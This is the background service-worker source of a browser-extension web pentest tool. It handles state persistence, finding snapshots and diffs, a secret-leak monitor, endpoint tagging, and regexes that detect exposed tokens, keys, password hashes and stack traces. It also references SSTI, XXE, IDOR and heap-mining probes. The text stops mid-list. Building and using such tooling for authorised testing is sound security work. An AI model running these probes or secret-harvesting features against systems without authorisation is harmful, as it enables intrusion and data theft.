// PenScope v5.9 — Background Service Worker
// v5.1: Full Endpoint Discovery + Probe Engine (22 steps)
// v5.2: IndexedDB + CacheStorage + JWT + Route classification + Permission matrix + IDOR
// v5.3: POST body + API response scan + Coverage + Event listeners + Shadow DOM + Memory mining
// v5.4: gRPC + WebAssembly + WebRTC leaks + BroadcastChannel + WebAuthn + Compression oracle
// v5.5: WASM hex dump + crypto detect + WebGPU + WS hijack + Cache poison + Timing oracle + COOP/COEP + Storage partition (29 steps)
// v5.6: Base64-encoded response body decoding + SPA coverage restart + memory-string substring scan + GraphQL op extractor + source-map symbol table
// v5.7: Custom headers + smart recursive API discovery (3 waves) + in-probe findings scanner + GraphQL query field auto-probing (30 steps)
// v5.8: Stealth mode (jitter/random pauses) + session persistence + HAR import + Nuclei export + severity confidence weighting + Deep tab filter/collapse
// v5.9: Attack Chain Correlator (12 compound exploit patterns) + 6 new probe steps (ParamDiscovery, SSTI, XXE, CRLF, Version Downgrade, Proto Pollution) + Real stealth (shuffled paths) + Severity weighting on all scanners — 36 total attack vectors

const CONFIG = {
  MAX_SCRIPTS: 80,
  MAX_BODY_PREVIEW: 50000,
  MAX_BODY_DEEP: 500000,
  MAX_BODY_API: 200000,
  MAX_POST_BODY: 10000,
  MAX_POST_BODIES: 200,
  MAX_HEADER_INTEL: 200,
  MAX_API_RESPONSES: 100,
  MAX_CONSOLE_LOGS: 200,
  MAX_AUTH_HEADER_LEN: 500,
  MAX_COOKIE_VALUE_LEN: 200,
  EXTRACTION_DELAY: 3000,
  SCRIPT_EXTRACT_DELAY_1: 6000,
  SCRIPT_EXTRACT_DELAY_2: 15000,
  PENDING_TTL: 60000,
  PENDING_CLEANUP_INTERVAL: 30000,
};

const state={};const _seen={};const _debugTabs=new Set();const _pending={};const _scripts={};
setInterval(()=>{const now=Date.now();for(const k of Object.keys(_pending)){if(_pending[k]._ts&&now-_pending[k]._ts>CONFIG.PENDING_TTL)delete _pending[k];}},CONFIG.PENDING_CLEANUP_INTERVAL);

// v5.8: State persistence via chrome.storage.session — survives service worker restarts so a
// 5-minute idle doesn't wipe findings. Session storage clears on browser close, which is the
// right lifetime for a recon tool. Save is debounced + trimmed; restore rehydrates endpointIndex.
const _dirtyTabs=new Set();
let _saveTimer=null;
function markDirty(tabId){
  _dirtyTabs.add(tabId);
  if(_saveTimer)return;
  _saveTimer=setTimeout(flushDirty,5000);
}
async function flushDirty(){
  _saveTimer=null;
  const tabs=[..._dirtyTabs];
  _dirtyTabs.clear();
  for(const tabId of tabs){
    if(!state[tabId])continue;
    try{
      const snap=serializeTabState(state[tabId]);
      await chrome.storage.session.set({[`ps:tab:${tabId}`]:snap});
    }catch(e){console.warn('[PenScope] persist',e.message||e);}
  }
}
function serializeTabState(d){
  // Strip non-serializable + trim large arrays to stay under the session storage quota
  const snap={};
  for(const k in d){
    if(k==="endpointIndex")continue;
    if(k==="_loadTimers")continue;
    if(typeof d[k]==="function")continue;
    snap[k]=d[k];
  }
  // v5.9.1: endpointMeta has Set values — Sets don't JSON-serialize, so convert to arrays
  // with a sentinel marker so deserialization can rehydrate them. Without this, the restored
  // state has plain objects where Sets should be, and the next webRequest.onHeadersReceived
  // crashes with "statuses.add is not a function". BUG #8.
  if(d.endpointMeta){
    const metaSnap={};
    for(const k in d.endpointMeta){
      const v=d.endpointMeta[k];
      if(!v)continue;
      metaSnap[k]={
        statuses:Array.isArray(v.statuses)?v.statuses:[...(v.statuses||[])],
        sizes:v.sizes||[],
        queries:Array.isArray(v.queries)?v.queries:[...(v.queries||[])],
        _serialized:true
      };
    }
    snap.endpointMeta=metaSnap;
  }
  if(snap.endpoints&&snap.endpoints.length>500)snap.endpoints=snap.endpoints.slice(-500);
  if(snap.apiResponseBodies&&snap.apiResponseBodies.length>60)snap.apiResponseBodies=snap.apiResponseBodies.slice(-60);
  if(snap.postBodies&&snap.postBodies.length>100)snap.postBodies=snap.postBodies.slice(-100);
  if(snap.discoveredRoutes&&snap.discoveredRoutes.length>800)snap.discoveredRoutes=snap.discoveredRoutes.slice(-800);
  if(snap.scriptSources&&snap.scriptSources.length>300)snap.scriptSources=snap.scriptSources.slice(-300);
  if(snap.consoleLogs&&snap.consoleLogs.length>150)snap.consoleLogs=snap.consoleLogs.slice(-150);
  if(snap.perfEntries&&snap.perfEntries.length>200)snap.perfEntries=snap.perfEntries.slice(-200);
  if(snap.exploitChains&&snap.exploitChains.length>30)snap.exploitChains=snap.exploitChains.slice(0,30);
  if(snap.headerIntel&&snap.headerIntel.length>150)snap.headerIntel=snap.headerIntel.slice(-150);
  return snap;
}
async function restoreStateOnStartup(){
  try{
    const all=await chrome.storage.session.get(null);
    Object.keys(all).forEach(k=>{
      if(!k.startsWith("ps:tab:"))return;
      const tabId=parseInt(k.substring(7));
      if(isNaN(tabId)||state[tabId])return;
      const snap=all[k];
      if(!snap||typeof snap!=="object")return;
      state[tabId]=snap;
      // Rehydrate endpointIndex Map (can't be serialized as JSON)
      state[tabId].endpointIndex=new Map();
      (snap.endpoints||[]).forEach(e=>{if(e.url)state[tabId].endpointIndex.set(e.url,e);});
      // v5.9.1 — Rehydrate endpointMeta Sets. The serializer converts Set→array with a
      // _serialized marker; if we don't convert back to Set, the next webRequest listener
      // call that does `statuses.add(code)` throws. BUG #8 fix.
      if(state[tabId].endpointMeta){
        for(const mk in state[tabId].endpointMeta){
          const v=state[tabId].endpointMeta[mk];
          if(v&&v._serialized){
            state[tabId].endpointMeta[mk]={
              statuses:new Set(v.statuses||[]),
              sizes:v.sizes||[],
              queries:new Set(v.queries||[])
            };
          }else if(v&&!(v.statuses instanceof Set)){
            // Defensive: even without the marker, if statuses isn't a Set, coerce it
            state[tabId].endpointMeta[mk]={
              statuses:new Set(Array.isArray(v.statuses)?v.statuses:[]),
              sizes:v.sizes||[],
              queries:new Set(Array.isArray(v.queries)?v.queries:[])
            };
          }
        }
      }
    });
  }catch(e){console.warn('[PenScope] restore',e.message||e);}
}
restoreStateOnStartup();

// -------------------------------------------------------
// v6.0: Snapshot system + continuous monitor (Blue mode)
// -------------------------------------------------------
// Snapshots are keyed by base hostname in chrome.storage.local under "ps:snap:<host>".
// Each entry is {snapshots:[{ts,version,url,findings:{},chains:[],endpoints:[],techStack:[],hash,score}]}.
// Cap 20 per host with FIFO eviction. Stable finding IDs let us match the same finding
// across two scans for diff (Phase 5).

const SNAP_CAP_PER_HOST = 20;

function snapHostFor(tab){
  try{const u=new URL(tab.url||"");return u.hostname;}catch(e){return null;}
}

// Stable finding hash matching the popup-side stableHash exactly. Update both when
// changing the algorithm.
function snapStableHash(s){
  let h=2166136261>>>0;
  for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619)>>>0;}
  return ("00000000"+h.toString(16)).slice(-8);
}

// Walk a tab's state and produce the same {id,type,severity,where,evidence} list the
// popup-side collectBlueFindings produces. Kept as a near-mirror so snapshot diff
// matches what Blue mode shows the user.
function snapCollectFindings(d){
  const raw=[];
  function add(type,severity,where,evidence){
    const id=snapStableHash([type,where||"",String(evidence||"").substring(0,80)].join("|"));
    raw.push({id,type,severity:severity||"medium",where:where||"",evidence:String(evidence||"").substring(0,200)});
  }
  // v6.0.1 — Match popup-side dedup: header issues from main_frame only, cookies
  // dedup'd by (name, issue). Without this, the snapshot stores 700+ "medium"
  // entries that the diff view then has to dedupe — wastes storage and skews
  // the regression metrics.
  const mainHeader=(d.headers||[]).find(h=>h&&h.type==="main_frame")||(d.headers||[])[0];
  if(mainHeader){
    (mainHeader.missing||[]).forEach(m=>add(`missing-header:${m.header}`,m.severity||"medium","main",m.desc));
  }
  const seenCookies=new Set();
  (d.headers||[]).forEach(h=>{
    (h.cookieIssues||[]).forEach(c=>{
      const key=`${c.cookie||""}|${c.issue||""}`;
      if(seenCookies.has(key))return;
      seenCookies.add(key);
      const issue=String(c.issue||"").toLowerCase();
      if(/httponly/.test(issue))add("cookie-no-httponly",c.severity||"medium",c.cookie||"cookie",c.issue);
      else if(/secure/.test(issue))add("cookie-no-secure",c.severity||"medium",c.cookie||"cookie",c.issue);
      else if(/samesite/.test(issue))add("cookie-no-samesite",c.severity||"medium",c.cookie||"cookie",c.issue);
    });
  });
  (d.secrets||[]).forEach(s=>add(`exposed-secret:${s.type||""}`,s.severity||"high",s.source||"",s.value));
  (d.sourceMaps||[]).forEach(sm=>add("sourcemap-leak","medium",sm.mapUrl||"",sm.mapUrl));
  (d.xssSinks||[]).forEach(x=>add(`xss-sink:${x.name||""}`,x.severity||"high",x.url||"",x.context));
  const pr=d.probeData||{};
  (pr.sstiResults||[]).forEach(r=>{if(r.confirmed)add("ssti-confirmed",r.severity||"critical",r.path,r.evidence);});
  (pr.xxeResults||[]).forEach(r=>{if(r.confirmed)add("xxe-confirmed",r.severity||"critical",r.path,r.evidence);});
  (pr.crlfResults||[]).forEach(r=>{if(r.confirmed)add("crlf-injection",r.severity||"high",r.path,r.evidence);});
  (pr.bacResults||[]).forEach(r=>add("broken-access-control",r.severity||"high",r.path,r.note||""));
  (pr.idorAutoResults||[]).forEach(r=>{if(r.sameBody)add("idor-confirmed","high",r.path,"same body");});
  (pr.authRemovalResults||[]).forEach(r=>{if(r.severity==="critical"||r.severity==="high")add("auth-removal",r.severity,r.path,"unauth ok");});
  (pr.corsResults||[]).forEach(r=>{if(r.reflected&&r.allowsCredentials)add("cors-wildcard-credentials","high",r.path,"reflected");});
  (pr.csrfResults||[]).forEach(r=>{if(r.severity==="medium"||r.severity==="high")add("missing-csrf",r.severity,r.path,r.note||"");});
  (pr.jwtAlgResults||[]).forEach(r=>{if(r.confirmed)add("jwt-alg-none","critical",r.path,r.note||"");});
  (pr.openRedirects||[]).forEach(r=>{if(r.confirmed)add("open-redirect","medium",r.path,r.payload||"");});
  (d.stackAttacks||[]).forEach(a=>{if(a.confirmed)add(`stack-${a.family}-${a.step}`,a.severity||"medium",a.url||"",a.evidence||"");});
  // v6.0.1 — Mixed content + missing SRI dedup'd by host (matches popup-side aggregator)
  const seenMixed=new Set();
  (d.mixedContent||[]).forEach(m=>{
    let host="";try{host=new URL(m.url).hostname;}catch(e){host=m.url||"";}
    if(seenMixed.has(host))return;seenMixed.add(host);
    add("mixed-content",m.risk||"medium",host,m.type);
  });
  const seenSri=new Set();
  (d.missingSRI||[]).forEach(s=>{
    let host="";try{host=new URL(s.url).hostname;}catch(e){host=s.url||"";}
    if(seenSri.has(host))return;seenSri.add(host);
    add("missing-sri","low",host,s.type);
  });
  // Final dedup pass — collapse to one entry per (type, where), keeping the highest severity.
  const sevOrd={critical:5,high:4,medium:3,low:2,info:1};
  const dedup=new Map();
  raw.forEach(f=>{
    const key=`${f.type}|${f.where}`;
    const prev=dedup.get(key);
    if(!prev||(sevOrd[f.severity]||0)>(sevOrd[prev.severity]||0))dedup.set(key,f);
  });
  return [...dedup.values()];
}

function snapHealthScore(findings){
  // v6.0.1 — STRICT scoring (mirrors popup.js#computeHealthScore). Only crits and
  // highs move the score; mediums/lows are tracked but don't penalize. Cap cost at 90
  // so floor is 10. Update both functions when changing the curve.
  const c={critical:0,high:0,medium:0,low:0,info:0};
  findings.forEach(f=>{c[f.severity]=(c[f.severity]||0)+1;});
  const cost=Math.min(90,c.critical*22+c.high*9);
  return Math.max(10,100-cost);
}

async function saveSnapshot(tabId){
  const t=T(tabId);
  const host=snapHostFor(t);
  if(!host)throw new Error("no host");
  const findings=snapCollectFindings(t);
  const score=snapHealthScore(findings);
  const snap={ts:Date.now(),version:"6.0.0",url:t.url||"",score,findings,chains:(t.exploitChains||[]).slice(0,30),endpoints:(t.endpoints||[]).map(e=>({path:e.path,method:e.method,status:e.status,host:e.host})).slice(0,500),techStack:(t.techStack||[]).map(x=>x.name)};
  const key=`ps:snap:${host}`;
  try{
    const stored=await chrome.storage.local.get(key);
    const bucket=stored[key]||{snapshots:[]};
    bucket.snapshots.push(snap);
    if(bucket.snapshots.length>SNAP_CAP_PER_HOST)bucket.snapshots=bucket.snapshots.slice(-SNAP_CAP_PER_HOST);
    await chrome.storage.local.set({[key]:bucket});
    return {host,count:bucket.snapshots.length,score};
  }catch(e){throw new Error("storage: "+(e.message||e));}
}

async function diffSnapshotsForTab(tabId,host){
  const t=T(tabId);
  if(!host)host=snapHostFor(t);
  if(!host)return {host:null,diff:{new:[],resolved:[],unchanged:[]}};
  const key=`ps:snap:${host}`;
  const stored=await chrome.storage.local.get(key);
  const bucket=stored[key]||{snapshots:[]};
  const last=bucket.snapshots[bucket.snapshots.length-1];
  if(!last)return {host,last:null,diff:{new:[],resolved:[],unchanged:[]}};
  const current=snapCollectFindings(t);
  const lastIds=new Set((last.findings||[]).map(f=>f.id));
  const currentIds=new Set(current.map(f=>f.id));
  const newOnes=current.filter(f=>!lastIds.has(f.id));
  const resolved=(last.findings||[]).filter(f=>!currentIds.has(f.id));
  const unchanged=current.filter(f=>lastIds.has(f.id));
  return {host,last,diff:{new:newOnes,resolved,unchanged}};
}

// Continuous monitor — alarm fires every 5 min while the SW is alive. We re-extract
// secrets from the live tab's content (via a quick chrome.scripting.executeScript +
// chrome.cookies.getAll) and compare to tab.continuousMonitor.lastSnapshot. New
// secrets trigger a chrome.notifications notification.
chrome.alarms.onAlarm.addListener(async alarm=>{
  if(!alarm.name||!alarm.name.startsWith("ps:cm:"))return;
  const tabId=parseInt(alarm.name.substring(6));if(isNaN(tabId))return;
  const t=state[tabId];if(!t||!t.continuousMonitor||!t.continuousMonitor.enabled)return;
  try{
    // Refresh secrets via a scripting probe (DOM scan + memory mining is in the
    // content script's scan path). chrome.runtime.lastError must be touched in the
    // callback or Chrome logs an unhandled-error warning when the tab/content script
    // is gone (closed tab, internal page like chrome://, etc.) — cheap to defend.
    chrome.tabs.sendMessage(tabId,{action:"scan"},()=>{void chrome.runtime.lastError;});
    // Allow the scan to flush back to state[tabId].secrets, then compare in 3s.
    setTimeout(async()=>{
      const t2=state[tabId];if(!t2)return;
      const currentSecrets=(t2.secrets||[]).map(s=>`${s.type}|${s.value}`.substring(0,200));
      const lastSnap=t2.continuousMonitor.lastSnapshot||{secrets:[]};
      const lastSet=new Set(lastSnap.secrets||[]);
      const newSecrets=currentSecrets.filter(k=>!lastSet.has(k));
      if(newSecrets.length){
        // Get host for the notification
        let host="";try{host=new URL(t2.url||"").hostname;}catch(e){}
        chrome.notifications.create("ps:secret-leak:"+tabId+":"+Date.now(),{
          type:"basic",
          iconUrl:"icons/icon128.png",
          title:"PenScope: secret leak detected",
          message:`${newSecrets.length} new secret${newSecrets.length===1?"":"s"} on ${host||"target"} — open Blue mode to triage.`,
          priority:2,
        });
        t2.continuousMonitor.alerts=(t2.continuousMonitor.alerts||[]).concat([{ts:Date.now(),count:newSecrets.length,host}]).slice(-20);
      }
      t2.continuousMonitor.lastSnapshot={ts:Date.now(),secrets:currentSecrets};
      markDirty(tabId);
    },3000);
  }catch(e){console.warn("[PenScope] continuous monitor",e&&e.message||e);}
});
function T(tabId){if(!state[tabId]){state[tabId]={url:"",endpoints:[],headers:[],secrets:[],hiddenFields:[],sourceMaps:[],forms:[],techStack:[],jsGlobals:[],storageData:{local:{},session:{}},cookies:[],wsConnections:[],wsMessages:[],params:{},authFlows:[],subdomains:[],thirdParty:[],links:[],inlineHandlers:[],metaTags:[],serviceWorkers:[],cspViolations:[],deepEnabled:false,requestHeaders:[],responseBodies:[],certInfo:null,errorBodies:[],redirectChains:[],apiVersions:[],swaggerEndpoints:[],endpointMeta:{},endpointIndex:new Map(),
// v4+ fields
mixedContent:[],sriIssues:[],postMessageListeners:[],dependencyVersions:[],webWorkers:[],domXSSSinks:[],jsonpEndpoints:[],cookieFindings:[],reconSuggestions:[],pathParams:[],methodSuggestions:[],
// v4+ runtime fields
runtime:{framework:null,services:[],routes:[],stores:[],protoMethods:[],eventListeners:[],runtimeSecrets:[],frameworkState:{},ephemeralDOM:[],interestingGlobals:[]},
interceptedRequests:[],
networkTiming:{},
// v5 new fields — CDP domain extraction
scriptSources:[],    // Debugger.getScriptSource — secrets/endpoints found in JS
consoleLogs:[],      // Log.entryAdded — captured console messages
auditIssues:[],      // Audits.issueAdded — Chrome security findings
executionContexts:[], // Runtime.executionContextCreated — iframes, workers
// v5.1 — passive endpoint discovery from all sources
discoveredRoutes:[], // All routes/endpoints found via script analysis + runtime extraction
// v5.1 — active recon results (opt-in, sends requests)
probeData:null,
// v5.2 — deep passive extraction
indexedDBData:[],    // IndexedDB databases, stores, and data
cacheStorageData:[], // CacheStorage/SW cached responses
jwtFindings:[],      // Decoded JWT tokens from all sources
permissionMatrix:[], // Routes matched against user role
idorTests:[],        // Auto-generated IDOR test commands
// v5.3 — aggressive extraction
postBodies:[],       // Captured POST/PUT/PATCH request bodies
apiResponseBodies:[], // Full API response bodies with deep scanning
coverageData:null,   // JS/CSS coverage — dead code = hidden features
domListeners:[],     // All event listeners from DOM nodes
shadowDOMData:[],    // Content extracted from shadow roots
memoryStrings:[],    // Interesting strings found in V8 heap via Runtime
encodedBlobs:[],     // Detected base64, JWT, hex, URL-encoded, encrypted blobs
// v5.3.1 — network intelligence
dnsPrefetch:[],      // DNS prefetch/preconnect hints — reveals backend infrastructure
iframeScan:[],       // All iframes with URLs, sandbox attrs, postMessage listeners
headerIntel:[],      // Interesting HTTP header values (X-Request-Id, Via, Server-Timing, etc.)
perfEntries:[],      // performance.getEntries() — every resource loaded with timing
cssContent:[],       // URLs and data extracted from CSS (background-image, @import, content)
harvestedMaps:[],    // Full parsed source maps from probe — sources, secrets, file tree
// v5.3.2 — deep upgrades
realEventListeners:[],  // DOMDebugger.getEventListeners — actual JS listeners, not just HTML on* attrs
httpOnlyCookies:[],     // Network.getCookies — includes HttpOnly cookies invisible to document.cookie
responseSchemas:[],     // Auto-extracted API response schemas (field names, types, nesting)
heapSecrets:[],         // HeapProfiler — secrets found in V8 heap closures
// v5.3.2 — source map intelligence
parsedSourceMaps:[],    // Fully parsed source maps (passive auto-capture + probe)
// v5.4 — expanded attack surface
grpcEndpoints:[],       // gRPC-related endpoints (.proto, /grpc/, gRPC-Web)
wasmModules:[],         // WebAssembly modules detected via CDP
webrtcLeaks:[],         // WebRTC IP leak detection results
broadcastChannels:[],   // BroadcastChannel messages intercepted
webAuthnInfo:null,      // WebAuthn/FIDO2 capability and config
compressionResults:[],
grpcReflection:null,
wsHijackResults:[],
cachePoisonProbe:[],
timingOracle:[],
coopCoepInfo:null,
storagePartition:[],
webgpuInfo:null,
// v5.6 — new fields
graphqlOps:[],        // Parsed GraphQL operations from captured POST bodies (passive schema reconstruction)
symbolTable:[],       // Aggregated pre-minification identifiers from source-map `names` arrays
// v5.9 — attack chain correlator output (headline intelligence feature)
exploitChains:[],
// v6.0 — view mode for the popup. Default "classic" preserves byte-for-byte v5.9 behavior.
// "red" and "blue" are theme + renderer choices over the SAME data engine — every field
// above is collected the same way regardless of mode. Mode is per-tab and persists across
// service worker restarts via the existing markDirty/serializeTabState pipeline.
mode:"classic",
// v6.0 — Phase 2 will populate this with chain attacks queued by Claude (parsed from a
// fenced JSON block on the user's clipboard via the Sync from Claude button). Phase 1
// simply reserves the field so persistence/migration is consistent.
claudeQueue:[],
// v6.0 — Phase 3 will populate this with stack-aware probe pack hits (Laravel/Spring/
// Rails/etc. when the corresponding tech is detected). Reserved here for the same reason.
stackAttacks:[],
// v6.0 — Phase 4 fields: findings the user has marked fixed (so the health score
// reflects the user's manual triage), and continuous monitor configuration (interval +
// last snapshot for diff-based notifications).
markedFixed:[],
continuousMonitor:null,
// v6.1 — Workbench state. Persisted across SW restarts via the existing markDirty
// pipeline. Repeater history is capped at 50; auth contexts are unbounded but the UI
// pages reasonably. authActive is a name into authContexts; "Anonymous" is implicit.
repeaterHistory:[],
authContexts:[{name:"Anonymous",cookies:{},headers:{},notes:"No auth — baseline for IDOR/BAC comparison"}],
authActive:"Anonymous",
startTime:Date.now()};}return state[tabId];}
function seen(tabId,ns,key){const k=`${tabId}:${ns}`;if(!_seen[k])_seen[k]=new Set();if(_seen[k].has(key))return true;_seen[k].add(key);return false;}

// Tag rules (25)
const TAG_RULES=[
  {regex:/\/(?:auth|login|logout|signin|signout|oauth|sso|token|session|password|forgot|verify|confirm|register|signup|mfa|2fa|otp)/i,tag:"auth",color:"#ff55aa"},
  {regex:/\/(?:admin|manage|management|backoffice|dashboard\/admin|controlpanel|superuser|staff|moderator)/i,tag:"admin",color:"#ff2244"},
  {regex:/\/(?:user|profile|account|me|member|people|person|student|teacher|employee|learner)/i,tag:"user",color:"#33aaff"},
  {regex:/\/(?:upload|download|file|attachment|media|image|document|blob|storage|export|import|backup|asset)/i,tag:"file",color:"#ff8833"},
  {regex:/\/(?:config|settings|preferences|options|env|feature|flag|toggle|system|setup)/i,tag:"config",color:"#aa55ff"},
  {regex:/\/(?:api|graphql|gql|rest|v\d+)/i,tag:"api",color:"#33ff88"},
  {regex:/\/(?:search|filter|query|find|lookup|suggest|autocomplete)/i,tag:"search",color:"#33ddbb"},
  {regex:/\/(?:pay|payment|checkout|billing|invoice|subscription|order|cart|purchase)/i,tag:"payment",color:"#ff4466"},
  {regex:/\/(?:notification|alert|message|chat|inbox|email|sms|push|webhook|feed)/i,tag:"comms",color:"#ffc83d"},
  {regex:/\/(?:report|analytics|stats|metrics|log|audit|monitor|health|status|ping|telemetry|tracking)/i,tag:"telemetry",color:"#606078"},
  {regex:/\/(?:swagger|api-docs|openapi|docs\/api|documentation|redoc|graphiql|playground|explorer)/i,tag:"docs",color:"#ff6b5a"},
  {regex:/\/(?:debug|test|dev|staging|internal|_internal|__debug|phpinfo|elmah|trace)/i,tag:"debug",color:"#ff2244"},
  {regex:/\/(?:delete|remove|destroy|purge|revoke|ban|block|disable|deactivate)/i,tag:"destructive",color:"#ff2244"},
  {regex:/\/(?:create|add|new|insert|register|submit|post|invite|enroll)/i,tag:"write",color:"#33ff88"},
  {regex:/\/(?:update|edit|modify|patch|change|set|put|rename)/i,tag:"write",color:"#33ff88"},
  {regex:/\/(?:list|index|all|browse|catalog|get|fetch|read|view|show)/i,tag:"read",color:"#33aaff"},
  {regex:/\/(?:bulk|batch|mass|import|export|dump|archive|migrate)/i,tag:"bulk",color:"#ff8833"},
  {regex:/\/(?:role|permission|privilege|access|acl|scope|grant|policy)/i,tag:"authz",color:"#ff55aa"},
  {regex:/\/(?:share|collaborate|invite|team|group|organization|workspace)/i,tag:"share",color:"#ffc83d"},
  {regex:/\/(?:impersonate|sudo|become|act-as|switch-user)/i,tag:"impersonate",color:"#ff2244"},
  {regex:/\/(?:hook|callback|handler|listener|receiver|ingest)/i,tag:"webhook",color:"#aa55ff"},
  {regex:/\/(?:cron|job|task|queue|worker|scheduler|background)/i,tag:"background",color:"#606078"},
  {regex:/\/(?:cache|redis|purge|invalidate|flush|clear)/i,tag:"cache",color:"#606078"},
  {regex:/\/(?:embed|widget|iframe|oembed|plugin|extension)/i,tag:"embed",color:"#33ddbb"},
  {regex:/\/(?:cert|ssl|tls|key|secret|vault|kms|encrypt|decrypt)/i,tag:"crypto",color:"#aa55ff"},
];
function tagEndpoint(path){const tags=[];TAG_RULES.forEach(r=>{if(r.regex.test(path)&&!tags.find(t=>t.tag===r.tag))tags.push({tag:r.tag,color:r.color});});return tags;}

const API_VER_REGEX=/\/(?:api\/)?v(\d+)(?:\/|$|\?)/i;
function detectApiVersion(path,tabId){const match=path.match(API_VER_REGEX);if(!match)return;const ver=parseInt(match[1]);const key=path.replace(/v\d+/,"v{N}");if(seen(tabId,"apiver",key))return;const suggestions=[];for(let v=1;v<ver;v++)suggestions.push(path.replace(/v\d+/,`v${v}`));if(suggestions.length>0)T(tabId).apiVersions.push({path,currentVersion:ver,suggestedPaths:suggestions,reason:"Older API versions may have weaker auth or deprecated endpoints"});}

const SWAGGER_PATHS=["/swagger.json","/swagger/v1/swagger.json","/swagger-ui.html","/swagger-ui/","/api-docs","/api-docs.json","/openapi.json","/openapi.yaml","/openapi/v3","/docs","/docs/api","/redoc","/graphiql","/playground","/explorer","/api/schema","/schema","/_api/docs","/v1/api-docs","/v2/api-docs","/swagger-resources","/api/swagger","/api-explorer","/api/docs"];
function checkSwagger(path,url,tabId){const lower=path.toLowerCase();SWAGGER_PATHS.forEach(sp=>{if((lower.includes(sp)||lower===sp)&&!seen(tabId,"swagger",sp))T(tabId).swaggerEndpoints.push({path,url,matchedPattern:sp});});}

const SEC_HEADERS={"content-security-policy":{sev:"high",desc:"No CSP — XSS/injection risk"},"strict-transport-security":{sev:"medium",desc:"No HSTS — MITM downgrade"},"x-frame-options":{sev:"medium",desc:"No X-Frame-Options — clickjacking"},"x-content-type-options":{sev:"low",desc:"No X-Content-Type-Options"},"referrer-policy":{sev:"low",desc:"No Referrer-Policy"},"permissions-policy":{sev:"low",desc:"No Permissions-Policy"},"cross-origin-opener-policy":{sev:"low",desc:"No COOP"},"cross-origin-resource-policy":{sev:"low",desc:"No CORP"},"cross-origin-embedder-policy":{sev:"low",desc:"No COEP"}};
const LEAK_HEADERS=["server","x-powered-by","x-aspnet-version","x-aspnetmvc-version","x-generator","x-drupal-cache","x-debug-token","x-debug-token-link","x-request-id","x-runtime","x-version","via","x-amz-request-id","cf-ray","x-vercel-id"];
const TECH_MAP={"x-powered-by":v=>{const l=v.toLowerCase();if(l.includes("express"))return"Express.js";if(l.includes("php"))return"PHP";if(l.includes("asp.net"))return"ASP.NET";if(l.includes("next"))return"Next.js";if(l.includes("flask"))return"Flask";if(l.includes("django"))return"Django";return`X-Powered-By: ${v}`;},"server":v=>{const l=v.toLowerCase();if(l.includes("nginx"))return"Nginx";if(l.includes("apache"))return"Apache";if(l.includes("cloudflare"))return"Cloudflare";if(l.includes("iis"))return"IIS";if(l.includes("vercel"))return"Vercel";if(l.includes("gunicorn"))return"Gunicorn";if(l.includes("uvicorn"))return"Uvicorn";if(l.includes("caddy"))return"Caddy";if(l.includes("envoy"))return"Envoy";return`Server: ${v}`;},"x-aspnet-version":()=>"ASP.NET","x-drupal-cache":()=>"Drupal","x-generator":v=>v};
const AUTH_PATTERNS=[{regex:/\/oauth/i,type:"OAuth"},{regex:/\/auth/i,type:"Auth"},{regex:/\/login/i,type:"Login"},{regex:/\/signup|\/register/i,type:"Registration"},{regex:/\/token/i,type:"Token"},{regex:/\/callback/i,type:"OAuth callback"},{regex:/\/sso/i,type:"SSO"},{regex:/\/logout/i,type:"Logout"},{regex:/\/password|\/forgot/i,type:"Password reset"},{regex:/\/\.well-known\//i,type:"Well-known"},{regex:/\/api\/v\d+\/users\/me/i,type:"User info"},{regex:/\/mfa|\/2fa|\/otp/i,type:"MFA"},{regex:/\/refresh/i,type:"Token refresh"},{regex:/\/saml/i,type:"SAML"}];
const AUTH_HDRS=["authorization","x-api-key","x-auth-token","x-csrf-token","x-xsrf-token","x-access-token","x-session-id","x-user-id","cookie","proxy-authorization"];

// 35 response body patterns
const RESP_PATTERNS=[
  {name:"Admin flag",regex:/"(?:is_admin|isAdmin|admin|is_superuser|is_staff|is_moderator)"\s*:\s*(true|false|1|0)/gi,sev:"high",desc:"Privilege flag — IDOR/escalation"},
  {name:"Role field",regex:/"(?:role|user_role|userRole|permission|permissions|access_level|privilege|scope|group_name|groupName)"\s*:\s*"?([^",}\]]{1,50})/gi,sev:"high",desc:"Role/permission exposed"},
  {name:"Auth token",regex:/"(?:access_token|refresh_token|bearer|jwt|session_token|auth_token|id_token)"\s*:\s*"([^"]{10,})"/gi,sev:"high",desc:"Auth token in response"},
  {name:"API key in resp",regex:/"(?:api_key|apiKey|api_secret|client_secret|secret_key)"\s*:\s*"([^"]{8,})"/gi,sev:"critical",desc:"API key/secret in response"},
  {name:"Internal ID",regex:/"(?:user_id|userId|account_id|accountId|internal_id|_id|member_id|customer_id|employee_id)"\s*:\s*"?([^",}\]]{1,80})/gi,sev:"medium",desc:"Internal ID — IDOR candidate"},
  {name:"Email in resp",regex:/"(?:email|mail|user_email|emailAddress)"\s*:\s*"([^"]{5,80})"/gi,sev:"low",desc:"Email leaked"},
  {name:"Phone in resp",regex:/"(?:phone|mobile|tel|phone_number)"\s*:\s*"?(\+?[\d\s()-]{7,20})/gi,sev:"medium",desc:"Phone leaked"},
  {name:"SSN/Tax ID",regex:/"(?:ssn|social_security|tax_id|national_id)"\s*:\s*"?([^",}\]]{5,20})/gi,sev:"critical",desc:"SSN/Tax ID exposed"},
  {name:"Password hash",regex:/"(?:password_hash|passwordHash|hashed_password|encrypted_password)"\s*:\s*"([^"]{10,})"/gi,sev:"critical",desc:"Password hash exposed"},
  {name:"Stack trace (Java)",regex:/at\s+[\w$.]+\([\w]+\.java:\d+\)/g,sev:"high",desc:"Java stack trace"},
  {name:"Stack trace (Python)",regex:/File\s+"[^"]+\.py",\s+line\s+\d+/g,sev:"high",desc:"Python traceback"},
  {name:"Stack trace (Node)",regex:/at\s+[\w$.]+\s+\((?:\/[\w./-]+|node:internal):\d+:\d+\)/g,sev:"high",desc:"Node.js stack trace"},
  {name:"Stack trace (PHP)",regex:/#\d+\s+[\w\\\/]+\.php\(\d+\)/g,sev:"high",desc:"PHP stack trace"},
  {name:"Stack trace (.NET)",regex:/at\s+[\w.]+\s+in\s+[\w:\\/.]+:\s*line\s+\d+/g,sev:"high",desc:".NET stack trace"},
  {name:"Stack trace (Ruby)",regex:/[\w/]+\.rb:\d+:in\s+`/g,sev:"high",desc:"Ruby stack trace"},
  {name:"Stack trace (Go)",regex:/goroutine\s+\d+\s+\[/g,sev:"high",desc:"Go goroutine stack"},
  {name:"SQL error",regex:/(?:mysql_|pg_|sqlite_|ORA-\d{5}|SQLSTATE|syntax error.*SQL|near ".*": syntax error|Unclosed quotation mark)/gi,sev:"critical",desc:"SQL error — possible SQLi"},
